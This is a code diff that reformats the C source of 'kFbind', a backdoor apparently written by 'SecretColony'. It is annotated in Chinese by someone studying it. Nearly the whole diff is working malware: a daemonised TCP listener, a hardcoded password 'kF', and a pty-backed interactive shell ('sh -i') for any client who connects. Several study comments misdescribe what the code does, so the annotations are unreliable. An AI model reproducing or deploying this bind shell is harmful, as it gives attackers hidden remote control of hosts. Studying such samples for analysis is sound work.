@@ -21,37 +21,34 @@
 #include <fcntl.h>
  
 struct winsize {
-unsigned short ws_row;
-unsigned short ws_col;
-unsigned short ws_xpixel;
-unsigned short ws_ypixel;
+    unsigned short ws_row;
+    unsigned short ws_col;
+    unsigned short ws_xpixel;
+    unsigned short ws_ypixel;
 };
  
 /* passwd protection by KillFinger oF SecretColony */
 int sc;
 char passwd[] = "kF";
 char motd[] ="=- SecretColony Lab N Research Project -=\n";
-//**************************************************************************************病毒的恶意部分***********************************************************
-void kf_shell()
-{
+
+void kf_shell () {
     char buffer[150];
  
     write(sc, "passwd ", 7); //用户在屏幕输入“passwd”，会让用户输入密码，同时系统也会输出相应的东西（刚开始一直没有看懂这个是什么意思？sc根本没有空间，后来直接在我的CentOs上输入了passwd，一下子系统就返回了change usr：，于是想到了，原来这句话是这个用途，感觉只看不自己去做有些东西是很难看出来的，至少对我来说是这样）
     read(sc, buffer, sizeof(buffer));
-    if (!strncmp(buffer, passwd, strlen(passwd))) //比较这个系统返回的话中是否有 has "kF"（我上网查了一下，网上很多都说kf是游戏服务器）
-    {
+
+    //比较这个系统返回的话中是否有 has "kF"（我上网查了一下，网上很多都说kf是游戏服务器）
+    if (!strncmp(buffer, passwd, strlen(passwd))) {
         write(sc, motd, sizeof(motd)); //改写密码
-    }
-    else
-    {
+    } else {
         write(sc, "DiE!!!\n", 7); //不能操作了
         close(sc); exit(0);
     }
 }
-//**********************************************************************************************************************************************************************
+
 /* creates tty/pty name by index */
-void get_tty(int num, char *base, char *buf)
-{
+void get_tty (int num, char *base, char *buf) {
     char series[] = "pqrstuvwxyzabcde";
     char subs[]   = "0123456789abcdef";
     int pos = strlen(base);        //base is tty/pty name 
@@ -62,48 +59,48 @@ void get_tty(int num, char *base, char *buf)
 }
  
 /* search for free pty and open it */
-int open_tty(int *tty, int *pty)
-{
+int open_tty (int *tty, int *pty) {
     char buf[512];
     int i, fd;
  
     fd = open("/dev/ptmx", O_RDWR); //write and read open it
     close(fd);
  
-    for (i=0; i < 256; i++)
-    {
+    for (i=0; i < 256; i++) {
         get_tty(i, "/dev/pty", buf);            //buf has a path "/dev/pty/XXXX"
         *pty = open(buf, O_RDWR);
-        if (*pty < 0)
+        
+        if (*pty < 0) {
             continue;
+        }
+
         get_tty(i, "/dev/tty", buf);              //buf has a path "/dev/tty/XXXX"
         *tty = open(buf, O_RDWR);
-        if (*tty < 0)
-        {
+        
+        if (*tty < 0) {
             close(*pty);
             continue;
         }
-            return 1;
-        }
+        
+        return 1;
+    }
+
     return 0;
 }
  
 /* to avoid creating zombies ;) */
-void sig_child(int i)
-{
+void sig_child (int i) {
     signal(SIGCHLD, sig_child);       //when process stop ,begin sig_child function
-    waitpid(-1, NULL, WNOHANG);   //suspend process temp
+    waitpid(-1, NULL, WNOHANG);       //suspend process temp
 }
  
-void hangout(int i)
-{
+void hangout (int i) {
     kill(0, SIGHUP);
     kill(0, SIGTERM);                           //终止与当前进程组内的所有进程
 }
   
 //调用
-int main()
-{
+int main () {
     int pid;
     struct sockaddr_in serv;    
     struct sockaddr_in cli;     
@@ -116,8 +113,8 @@ int main()
     // };
     int sock;
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock < 0)
-    {
+
+    if (sock < 0) {
         perror("socket");
         return 1;
     }
@@ -126,23 +123,24 @@ int main()
     serv.sin_family = AF_INET;
     serv.sin_addr.s_addr = htonl(INADDR_ANY);
     serv.sin_port = htons(PORT);
-    if (bind(sock, (struct sockaddr *) &serv, sizeof(serv)) < 0) //将套接字绑定到一个已知的地址上。
-    {
+
+    //将套接字绑定到一个已知的地址上。
+    if (bind(sock, (struct sockaddr *) &serv, sizeof(serv)) < 0) {
         perror("bind");
         return 1;
     }
-    if (listen(sock, 5) < 0)
-    {
+    
+    if (listen(sock, 5) < 0) {
         perror("listen");
         return 1;
     }
+
     printf("kFbind is starting...");
  
     fflush(stdout); //刷新标准输出缓冲区，把输出缓冲区里的东西打印到标准输出设备上
  
     pid = fork();     //create a child process,give child process id
-    if (pid !=0 )      //it's a father process
-    {
+    if (pid !=0 ) {
         printf("OK, pid = %d\n", pid);
         printf("Enj0y y0uR d00r by SecretColony\n");
         return 0;
@@ -158,26 +156,28 @@ int main()
     close(pid);
     signal(SIGHUP, SIG_IGN);     //发送给具有Terminal的Controlling Process，当terminal被disconnect时候发送
     signal(SIGCHLD, sig_child);  //when process stop ,begin sig_child function
-    while (1)
-    {
+    while (1) {
         int scli;
         int slen;
         slen = sizeof(cli);
         scli = accept(sock, (struct sockaddr *) &cli, &slen); //从连接请求队列中获得连接信息，
         //创建新的套接字，并返回该套接字的文件描述符。新创建的套接字用于服务器与客户机的通信，而原来的套接字仍然处于监听状态。
-        if (scli < 0)
+        if (scli < 0) {
             continue;
+        }
+
         pid = fork();   //create a child process,give child process id
-        if (pid == 0)   //it's child process
-        {
+        if (pid == 0) {
             int subshell;
             int tty;
             int pty;
             fd_set fds;
             char buf[BUF];
             char *argv[] = {"sh", "-i", NULL};
+
             #define MAXENV 256
             #define ENVLEN 256
+
             char *envp[MAXENV];
             char envbuf[(MAXENV+2) * ENVLEN];
             int j, i;
@@ -191,9 +191,11 @@ int main()
                     i = read(scli, &envbuf[j * ENVLEN], ENVLEN);
                     envp[j+1] = &envbuf[j * ENVLEN];
                     j++;
-                    if ((j >= MAXENV) || (i < ENVLEN))
+
+                    if ((j >= MAXENV) || (i < ENVLEN)) {
                         break;
-                } while (envbuf[(j-1) * ENVLEN] != '\n'); //直到读到回车为止
+                    }
+            } while (envbuf[(j-1) * ENVLEN] != '\n'); //直到读到回车为止
  
             envp[j+1] = NULL;
  
@@ -201,8 +203,7 @@ int main()
             setpgid(0, 0);            //目前进程ID将用作进程组ID
  
             /* open slave & master side of tty */
-            if (!open_tty(&tty, &pty))
-            {
+            if (!open_tty(&tty, &pty)) {
                 char msg[] = "Can't fork pty, bye!\n"; //还在这幽默呢
                 write(scli, msg, strlen(msg));
                 close(scli);
@@ -211,8 +212,8 @@ int main()
  
             /* fork child */
             subshell = fork();
-            if (subshell == 0)
-            {
+            
+            if (subshell == 0) {
                 /* close master */
                 close(pty);
                 /* attach tty */
@@ -244,49 +245,55 @@ int main()
             signal(SIGHUP, hangout);
             signal(SIGTERM, hangout); //发送终止信号时启用handout
  
-            while (1)
-            {
+            while (1) {
                 /* watch tty and client side */
                 FD_ZERO(&fds);      //初始化套接字
                 FD_SET(pty, &fds);  //将pty加入fds集合
                 FD_SET(scli, &fds); //将scli加入fds集合
-                if (select((pty > scli) ? (pty+1) : (scli+1),
-                &fds, NULL, NULL, NULL) < 0)
-                {
+
+                if (select((pty > scli) ? (pty+1) : (scli+1), &fds, NULL, NULL, NULL) < 0) {
                     break;
                 }
-                if (FD_ISSET(pty, &fds)) //检查在select函数返回后，某个描述符是否准备好，以便进行接下来的处理操作。
-                {
+
+                if (FD_ISSET(pty, &fds)) {
                     int count;
                     count = read(pty, buf, BUF);
-                    if (count <= 0)
+
+                    if (count <= 0) {
                         break;
-                    if (write(scli, buf, count) <= 0)//从pty里面读出来放入到Scli中
+                    }
+
+                    if (write(scli, buf, count) <= 0) {
                         break;
+                    }
                 }
-                if (FD_ISSET(scli, &fds))
-                {
+
+                if (FD_ISSET(scli, &fds)) {
                     int count;
                     unsigned char *p, *d;
                     d = buf;
                     count = read(scli, buf, BUF);
-                    if (count <= 0)
+                    
+                    if (count <= 0) {
                         break;
+                    }
  
                     /* setup win size */
                     p = memchr(buf, ECHAR, count); //从buf所指内存区域的前count个字节查找字符ECHAR。
-                    if (p)
-                    {
+                    
+                    if (p) {
                         unsigned char wb[5];
                         int rlen = count - ((ulong)p - (ulong)buf);
                         struct winsize ws;
  
                         /* wait for rest */
-                        if (rlen > 5)
+                        if (rlen > 5){
                             rlen = 5;
-                            memcpy(wb, p, rlen);
-                        if (rlen < 5)
-                        {
+                        }
+                        
+                        memcpy(wb, p, rlen);
+                        
+                        if (rlen < 5) {
                             read(scli, &wb[rlen], 5 - rlen);
                         }
  
@@ -300,14 +307,14 @@ int main()
                         /* write the rest */
                         write(pty, buf, (ulong) p - (ulong) buf);
                         rlen = ((ulong) buf + count) - ((ulong)p+5);
-                        if (rlen > 0)
+                        if (rlen > 0) {
                             write(pty, p+5, rlen);
-                    }
-                    else if (write(pty, d, count) <= 0)
+                        }
+                    } else if (write(pty, d, count) <= 0)
                         break;
- 
                     }
                 }
+
                 close(scli);
                 close(sock);
                 close(pty);
@@ -315,6 +322,7 @@ int main()
                 vhangup(); //将当前进程挂起
                 exit(0);
             }
+
             close(scli);
         }
 }
